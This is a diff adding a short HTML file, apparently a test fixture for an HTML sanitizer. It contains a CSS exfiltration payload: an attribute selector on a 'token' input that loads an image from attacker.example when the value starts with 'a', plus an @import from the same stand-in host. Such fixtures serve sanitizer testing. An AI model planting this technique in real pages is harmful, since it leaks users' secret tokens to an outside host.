@@ -1,0 +1,13 @@
+<!doctype html>
+<html><body>
+<section class="sanitized-fragment">
+  <input name="token" value="alpha">
+  <style>
+    input[name="token"][value^="a"] ~ .preview {
+      background-image: url("https://attacker.example/justhtml-preserved-style-a.png");
+    }
+    @import url("https://attacker.example/justhtml-import.css");
+  </style>
+  <div class="preview"></div>
+</section>
+</body></html>
